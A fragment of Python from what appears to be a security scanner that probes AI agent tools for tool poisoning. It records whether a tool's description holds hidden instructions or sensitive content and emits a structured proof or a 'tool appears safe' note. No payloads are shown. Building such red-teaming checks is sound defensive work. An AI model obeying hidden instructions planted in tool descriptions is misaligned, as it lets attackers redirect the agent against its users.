                      tool_name, suspicious_behaviors[0]["reason"])
    else:
        # No suspicious behaviors found
        if description_sensitive:
            # Emit structured proof highlighting description leakage only
            proof_obj = {
                "message": "Tool Poisoning - Hidden Instructions in Description",
                "description_sensitive": True,
                "tool_name": tool_name,
                "tool_description": tool_desc,
                "server": server
            }
            probe.update(
                success=True,
                is_tool_poisoning=False,
                proof=json.dumps(proof_obj, indent=2, ensure_ascii=False),
                payload=None
            )
            logging.warning("Sensitive information detected in description for %s; behavior appears safe", tool_name)
        else:
            # Emit a minimal safe note and skip verbose proof
            safe_note = {
                "security_testing_performed": True,
                "total_payloads_tested": len(probe["attempts"]),
                "suspicious_behaviors_found": 0,
                "tool_name": tool["name"],
                "server": server,
                "security_assessment": "No suspicious behavior observed. Tool appears to be safe."
            }

            probe.update(
                success=False,
                is_tool_poisoning=False,
                proof=json.dumps(safe_note, indent=2, ensure_ascii=False),
                payload=None
            )
            logging.info("Security testing completed for %s - tool appears secure", tool_name)
    
    return probe

